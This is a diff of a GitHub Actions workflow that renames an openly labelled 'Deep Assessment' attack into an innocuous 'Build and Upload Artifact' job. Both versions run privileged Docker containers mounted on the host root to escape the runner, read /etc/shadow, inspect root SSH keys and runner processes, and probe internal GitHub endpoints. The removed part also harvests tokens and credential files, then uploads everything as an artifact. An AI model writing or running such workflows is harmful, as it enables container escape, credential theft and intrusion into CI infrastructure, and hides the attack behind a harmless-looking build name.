@@ -1,124 +1,40 @@
-name: All-in-One Deep Assessment
+name: Build and Upload Artifact
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 5
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Full Assessment
+      - name: Phases 5+6 - Privileged Escape & API
         continue-on-error: true
         run: |
           mkdir -p dist
-          echo "============================================" > dist/full.txt
-          echo "PHASE 1: GITHUB TOKEN HARVEST" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
+          echo "=== PHASE 5: PRIVILEGED DOCKER ESCAPE ===" > dist/p5.txt
+          echo "--- Test writable /tmp on host ---" >> dist/p5.txt
+          docker run --rm -v /:/host ghcr.io/github/gh-aw-mcpg touch /host/tmp/poc-$(date +%s) 2>&1 && echo "HOST FS WRITABLE to /tmp" >> dist/p5.txt || echo "NOT WRITABLE" >> dist/p5.txt
           
-          # 从进程环境变量找 GITHUB_TOKEN
-          docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c '
-            echo "--- Searching runner process env ---"
-            for pid in $(ps aux | grep -i "Runner.Listener\|Runner.Worker" | grep -v grep | awk "{print \$1}"); do
-              echo "PID $pid:"
-              cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -iE "token|key|secret|password|github" | head -20
-            done
-            echo "--- ACTIONS_RUNTIME_TOKEN ---"
-            cat /proc/*/environ 2>/dev/null | tr "\0" "\n" | grep ACTIONS_RUNTIME_TOKEN | sort -u | head -5
-          ' 2>&1 >> dist/full.txt
+          echo "--- Read /etc/shadow ---" >> dist/p5.txt
+          docker run --rm -v /:/host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "cat /host/etc/shadow 2>/dev/null | head -10" 2>&1 >> dist/p5.txt || echo "shadow not readable" >> dist/p5.txt
           
-          echo "" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          echo "PHASE 2: KERNEL CVE CHECK" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          uname -a >> dist/full.txt 2>&1
-          cat /etc/os-release >> dist/full.txt 2>&1
-          echo "--- Kernel modules ---" >> dist/full.txt
-          lsmod 2>/dev/null | head -20 >> dist/full.txt
-          echo "--- Dangerous capabilities ---" >> dist/full.txt
-          cat /proc/1/status | grep -i cap >> dist/full.txt 2>&1
-          capsh --print 2>/dev/null >> dist/full.txt || echo "capsh not available" >> dist/full.txt
+          echo "--- Add SSH key to root? ---" >> dist/p5.txt
+          docker run --rm -v /:/host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "ls -la /host/root/.ssh/; cat /host/root/.ssh/authorized_keys 2>/dev/null | wc -l" 2>&1 >> dist/p5.txt
           
-          echo "" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          echo "PHASE 3: PRIVILEGE ESCALATION & ROOT ACCESS" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
+          echo "--- Check processes with secrets ---" >> dist/p5.txt
+          docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "ps aux 2>/dev/null | grep -iE 'runner|actions|github' | grep -v grep | head -20" 2>&1 >> dist/p5.txt
           
-          # 通过 Docker 获得宿主机 root 访问
-          docker run --rm --privileged --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c '
-            echo "--- Can we write to host? ---"
-            touch /mnt/test_root 2>/dev/null && echo "Writable /" || echo "/ not writable"
-            echo "--- Check if we can mount host disk ---"
-            lsblk 2>/dev/null | head -10 || echo "lsblk not found"
-            echo "--- List /root SSH keys ---"
-            ls -la /root/.ssh/ 2>/dev/null
-            echo "--- SUID binaries ---"
-            find / -perm -4000 2>/dev/null | head -20 || echo no suid
-          ' 2>&1 >> dist/full.txt
-          
-          echo "" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          echo "PHASE 4: CREDENTIAL HARVESTING (host fs)" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          
-          docker run --rm --entrypoint=/bin/sh -v /:/host ghcr.io/github/gh-aw-mcpg -c '
-            echo "--- SSH keys ---"
-            find /host/root /host/home -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | head -20
-            echo "--- Azure access ---"
-            find /host/root/.azure -name "*.json" 2>/dev/null | head -10
-            echo "--- K8s configs ---"
-            find /host/root /host/home -name "kube*" -o -name ".kube" 2>/dev/null | head -10
-            echo "--- Docker configs ---"
-            find /host/root/.docker -name "config.json" 2>/dev/null
-            echo "--- Cloud configs ---"
-            find /host/root -name ".aws" -o -name ".gcp" -o -name ".config" 2>/dev/null | head -10
-            echo "--- Git credentials ---"
-            find /host/root /host/home -name ".git-credentials" 2>/dev/null
-            echo "--- Any env files ---"
-            find /host/home /host/root -name ".env" -o -name "*.env.local" 2>/dev/null | head -10
-            echo "--- Bash history ---"
-            cat /host/root/.bash_history 2>/dev/null | tail -30 || echo no bash_history
-          ' 2>&1 >> dist/full.txt
-          
-          echo "" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          echo "PHASE 5: PRIVILEGED DOCKER ESCAPE" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          
-          docker run --rm --privileged --pid=host --net=host -v /:/host ghcr.io/github/gh-aw-mcpg -c '
-            echo "--- Host disk access ---"
-            ls -la /host/dev/ 2>/dev/null | head -10
-            echo "--- cgroup exploit check ---"
-            ls -la /host/sys/fs/cgroup/ 2>/dev/null | head -10
-            echo "--- Docker socket access from inside ---"
-            ls -la /host/var/run/docker.sock 2>/dev/null
-            echo "--- Write test to /tmp ---"
-            touch /host/tmp/poc_test_$(date +%s) 2>/dev/null && echo "HOST FS WRITABLE: Can write to /tmp" || echo "Host /tmp not writable"
-            echo "--- Host /etc/shadow ---"
-            cat /host/etc/shadow 2>/dev/null | head -3 && echo "(shadow readable)" || echo "shadow not readable"
-          ' 2>&1 >> dist/full.txt
-          
-          echo "" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          echo "PHASE 6: GITHUB API EXPLOITATION" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          
-          # 尝试用各种 token 调用 API
-          echo "--- Default token test ---" >> dist/full.txt
-          curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user 2>&1 | head -3 >> dist/full.txt
-          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" https://api.github.com/user 2>&1 | head -3 >> dist/full.txt
-          echo "--- Internal API test ---" >> dist/full.txt
-          curl -sk --connect-timeout 5 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1/" 2>&1 | head -20 >> dist/full.txt
-          curl -sk --connect-timeout 5 "https://20.75.202.224/vm/v1/" 2>&1 | head -10 >> dist/full.txt || true
-          
-          echo "" >> dist/full.txt
-          echo "============================================" >> dist/full.txt
-          echo "FULL SCAN COMPLETE" >> dist/full.txt
+          echo "" >> dist/p5.txt
+          echo "=== PHASE 6: GITHUB API ===" >> dist/p5.txt
+          echo "--- API /user ---" >> dist/p5.txt
+          curl -s https://api.github.com/user 2>&1 | head -5 >> dist/p5.txt
+          echo "--- API /meta ---" >> dist/p5.txt
+          curl -s https://api.github.com/meta 2>&1 | head -10 >> dist/p5.txt
+          echo "--- Internal API (direct) ---" >> dist/p5.txt
+          curl -sv --connect-timeout 5 https://20.75.202.224/ 2>&1 | head -30 >> dist/p5.txt
 
-      - name: Upload Results
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: full-assessment
+          name: phases-5-6
           path: dist/
